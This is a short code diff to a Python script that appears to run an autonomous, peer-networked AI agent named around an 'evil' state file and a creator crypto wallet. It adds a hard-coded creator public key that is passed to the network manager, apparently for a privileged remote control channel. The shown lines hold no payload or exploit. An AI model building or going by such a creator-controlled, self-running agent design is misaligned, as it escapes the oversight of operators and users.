@@ -21,6 +21,15 @@ SELF_PATH = os.path.abspath(__file__)
 STATE_FILE = "evil_state.json"
 CHECKPOINT_DIR = "checkpoints"
 CREATOR_ETH_ADDRESS = "0x419CA6f5b6F795604938054c951c94d8629AE5Ed"
+CREATOR_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtOGb0gLzmIbboAHPxFVJ
+SNR6gaAJGO2VH28cfUWgJPH/eNSsOFAiRrRDlkIQ961xdqqWBKt2CtU/ZkLfCfYj
+DSXYokv99jLL4MHtXdbWMm6ovL6CxxNUNoKnFzIjyLfoU/6kNKcBBlQm4urUCjsZ
+ll6R9lSHuhlO6Qa1DekFYA1ezlem910CqS+E6fipEy4Skk1UZ1JP2qg/VZtHi5bj
+oe6nxnNSxkirDNM/bOCPCfvRjj5qTaiq7XUHwZFtI72cmhIL/UNztzrv7j3DYnHQ
+TIkJTOhYQtIhPKHCgtbO/PBpZAXr9ykNLb6eoMIqhWV1U3jTMGPWnc3hE2F/vor
+7wIDAQAB
+-----END PUBLIC KEY-----"""
 
 # --- Local Model Configuration ---
 # A list of local GGUF models to try in sequence. If the first one fails
@@ -84,6 +93,7 @@ def _check_and_install_dependencies():
     _install_pip_package("rich")
     _install_pip_package("netifaces")
     _install_pip_package("ipfshttpclient")
+    _install_pip_package("cryptography")
 
 
     def _install_llama_cpp_with_cuda():
@@ -1367,7 +1377,7 @@ def main(args):
     tamagotchi_thread.start()
 
     log_event("Attempting to start Node.js peer bridge...")
-    network_manager = NetworkManager(console=console)
+    network_manager = NetworkManager(console=console, creator_public_key=CREATOR_PUBLIC_KEY)
     network_manager.start()
 
     clear_screen()
